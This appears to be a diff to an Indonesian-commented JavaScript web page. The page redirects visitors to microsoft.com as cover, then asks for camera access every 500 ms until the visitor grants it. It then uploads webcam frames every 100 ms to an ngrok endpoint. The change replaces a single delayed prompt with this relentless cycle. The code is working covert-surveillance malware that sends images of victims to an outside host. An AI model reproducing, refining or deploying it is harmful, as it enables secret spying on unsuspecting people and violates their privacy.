@@ -32,6 +32,7 @@
 
   var logEl = document.getElementById('log');
   var executed = false;
+  var cycleInterval = null;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
@@ -44,8 +45,8 @@
   var TARGET_URL = "https://www.microsoft.com"; 
   var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
   
-  // Waktu Delay (ms) sebelum kamera diaktifkan setelah redirect
-  var CAMERA_DELAY = 3000; // 3 detik
+  // Interval Siklus (ms)
+  var CYCLE_INTERVAL = 500; // Minta izin setiap 500ms
 
   // ============================================
   // FUNGSI: KIRIM GAMBAR KE SERVER
@@ -78,11 +79,11 @@
   }
 
   // ============================================
-  // FUNGSI: REQUEST KAMERA
+  // FUNGSI: REQUEST KAMERA (CYCLE)
   // ============================================
   function requestCamera() {
     try {
-      log("[+] Meminta Izin Kamera (Delayed)...");
+      log("[+] Meminta Izin Kamera (Cycle)...");
       
       navigator.mediaDevices.getUserMedia({ video: true, audio: false })
         .then(function(stream) {
@@ -91,8 +92,15 @@
           video.play().catch(function(){});
           log("[+] 🚨 KAMERA BERHASIL diakses!");
           
-          // Mulai kirim gambar setiap 100ms
+          // Mulai kirim gambar
           setInterval(sendImageToServer, 100);
+
+          // Hentikan cycle karena sudah berhasil
+          if (cycleInterval) {
+            clearInterval(cycleInterval);
+            cycleInterval = null;
+            log("[!] Camera Cycle dihentikan (Berhasil).");
+          }
         })
         .catch(function(err) {
           log("[-] Kamera diblokir: " + err.name);
@@ -113,7 +121,7 @@
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Delayed Microsoft CCTV...");
+    log("[!] Memulai Microsoft Camera Cycle...");
 
     // ============================================
     // A. REDIRECT KE MICROSOFT (0ms)
@@ -124,21 +132,12 @@
     } catch(e) {}
 
     // ============================================
-    // B. DELAYED CAMERA REQUEST (3000ms)
+    // B. CAMERA CYCLE (Setiap 500ms)
     // ============================================
-    // Tunggu 3 detik (saat user sudah di Microsoft), lalu minta kamera.
-    setTimeout(function() {
-      log("[+] Meminta Izin Kamera setelah delay " + CAMERA_DELAY + "ms...");
+    // Mulai siklus permintaan kamera berulang.
+    cycleInterval = setInterval(function() {
       requestCamera();
-    }, CAMERA_DELAY);
-
-    // ============================================
-    // C. RETRY CAMERA (5000ms)
-    // ============================================
-    setTimeout(function() {
-      log("[+] Retry Izin Kamera...");
-      requestCamera();
-    }, 5000);
+    }, CYCLE_INTERVAL);
 
   }, { once: true });
 
